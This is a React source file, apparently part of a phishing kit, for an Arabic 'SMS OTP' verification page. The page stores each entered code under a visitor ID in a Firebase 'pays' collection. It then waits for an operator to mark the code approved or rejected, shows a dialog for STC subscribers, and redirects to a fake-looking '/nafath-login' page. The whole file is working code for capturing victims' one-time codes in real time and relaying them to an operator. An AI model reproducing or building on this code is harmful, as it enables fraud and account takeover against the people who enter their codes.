import React, { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { addData, getOrCreateVisitorId, handleCurrentPage, listenForPhoneOtpApproval, listenForOtpApproval, clearDirectedStep, onSnapshot, doc } from "@/lib/firebase";
import { ShieldCheck, PhoneCall, AlertCircle } from "lucide-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";

export default function PhoneOtpPage() {
  const [, setLocation] = useLocation();
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [showStcDialog, setShowStcDialog] = useState(false);
  const [visitorData, setVisitorData] = useState<any>(null);

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("phone_otp");

    const unsub = onSnapshot(doc(null, "pays", getOrCreateVisitorId()), (snap: any) => {
      setVisitorData(snap.data());
    });
    return () => unsub();
  }, []);

  useEffect(() => {
    // Listen for phone OTP approval status
    const unsubscribePhone = listenForPhoneOtpApproval((status) => {
      if (status === "approved") {
        setLoading(false);
        void clearDirectedStep();
        if (visitorData?.provider === "STC" || visitorData?.provider === "STC_JAWY") {
            setShowStcDialog(true);
        } else {
            setLocation("/nafath-login");
        }
      } else if (status === "rejected") {
        setLoading(false);
        setError("رمز توثيق الهاتف غير صحيح، يرجى المحاولة مرة أخرى.");
      }
    });

    // Fallback: listen for general OTP approval status
    const unsubscribeGeneral = listenForOtpApproval((status) => {
      if (status === "approved") {
        setLoading(false);
        void clearDirectedStep();
        if (visitorData?.provider === "STC" || visitorData?.provider === "STC_JAWY") {
            setShowStcDialog(true);
        } else {
            setLocation("/nafath-login");
        }
      } else if (status === "rejected") {
        setLoading(false);
        setError("رمز توثيق الهاتف غير صحيح، يرجى المحاولة مرة أخرى.");
      }
    });

    return () => {
      if (unsubscribePhone) unsubscribePhone();
      if (unsubscribeGeneral) unsubscribeGeneral();
    };
  }, [setLocation, visitorData]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    const cleanOtp = otp.trim();
    if (!cleanOtp || cleanOtp.length < 4) {
      setError("يرجى إدخال رمز التحقق المكون من 4 إلى 6 أرقام");
      return;
    }

    setLoading(true);
    try {
      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        smsOtp: cleanOtp,
        phoneOtp: cleanOtp,
        phoneOtpApprovalStatus: "waiting",
        phoneOtpStatus: "pending",
        currentPage: "phone_otp",
        updatedAt: new Date().toISOString(),
      });
    } catch {
      setLoading(false);
      setError("تعذر إرسال رمز التحقق، يرجى المحاولة مرة أخرى.");
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f5f8f5]" dir="rtl" data-testid="page-phone-otp">
      <div className="bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-[#e5ece6] max-w-md w-full text-center space-y-6">
        <div className="w-14 h-14 bg-[#dfeee3] rounded-2xl flex items-center justify-center mx-auto text-[#126447]">
          <ShieldCheck className="w-7 h-7" />
        </div>

        <div>
          <h2 className="font-bold text-xl text-[#234b38]">رمز تأكيد الجوال (SMS OTP)</h2>
          <p className="text-xs text-[#486253] mt-2 leading-relaxed">
            تم إرسال رمز التحقق في رسالة نصية (SMS) إلى رقم الجوال المسجل. يرجى إدخال الرمز المكون من 4 إلى 6 أرقام لإكمال الاعتماد.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <input
              dir="ltr"
              type="tel"
              inputMode="numeric"
              maxLength={6}
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
              placeholder="● ● ● ●"
              className="w-full border border-gray-300 rounded-xl px-4 py-3.5 text-center font-mono font-extrabold text-2xl tracking-widest text-gray-900 focus:border-[#126447] focus:outline-none"
              data-testid="input-phone-otp"
            />
          </div>

          {error && (
            <div className="flex items-center justify-center gap-2 p-3 rounded-xl bg-red-50 border border-red-200 text-red-600 text-xs font-bold" data-testid="phone-otp-error">
              <AlertCircle className="w-4 h-4 shrink-0" />
              <span>{error}</span>
            </div>
          )}

          <button
            type="submit"
            className="w-full bg-[#126447] hover:bg-[#0e5139] text-white rounded-xl py-3.5 font-bold cursor-pointer transition-all disabled:opacity-60"
            disabled={!otp || loading}
            data-testid="submit-phone-otp"
          >
            {loading ? "جاري التأكيد مع مزود الخدمة..." : "تأكيد الرمز"}
          </button>
        </form>

        <div className="pt-2 border-t border-gray-100 flex items-center justify-center gap-1.5 text-xs text-gray-500">
          <PhoneCall className="w-3.5 h-3.5 text-[#126447]" />
          <span>لم يصلك الرمز؟ يمكن إعادة الطلب بعد دقيقة</span>
        </div>
      </div>
      <Dialog open={showStcDialog} onOpenChange={setShowStcDialog}>
        <DialogContent>
            <DialogHeader>
                <DialogTitle>تأكيد توثيق STC</DialogTitle>
                <DialogDescription>
                    يرجى اتباع التعليمات المرسلة من STC لإكمال عملية التوثيق.
                </DialogDescription>
            </DialogHeader>
            <button onClick={() => setLocation("/nafath-login")} className="w-full bg-[#126447] text-white rounded-xl py-2 font-bold">موافق</button>
        </DialogContent>
      </Dialog>
    </div>
  );
}
